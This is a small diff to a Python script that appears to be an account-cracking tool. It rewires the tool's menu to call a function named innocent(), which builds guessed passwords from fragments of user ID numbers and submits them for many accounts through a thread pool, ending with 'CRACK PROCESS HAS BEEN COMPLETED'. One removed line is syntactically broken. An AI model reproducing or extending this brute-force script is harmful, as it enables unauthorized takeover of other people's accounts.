@@ -176,7 +176,7 @@ def mumit_menu():
     print('\033[1;92m [0] EXIT TOOL')
     linex()
     mumit=input(' \033[1;32m[?] SELECT MENU: ')
-    if mumit in['1','01']:Ax-Pro()
+    if mumit in['1','01']:innocent()
     elif mumit in['0','00']:exit()
     else:exit()
     
@@ -210,7 +210,7 @@ def innocent():
         print('\033[1;92m [!] Use Flight Mode For Speed Up')
         linex()
         for love in user:
-            pwx = [love[1:]'bangladesh']
+            pwx = [love[1:]]
             uid = code+love
             ahare.submit(mumitx,uid,pwx,tl)
     print('CRACK PROCESS HAS BEEN COMPLETED ')
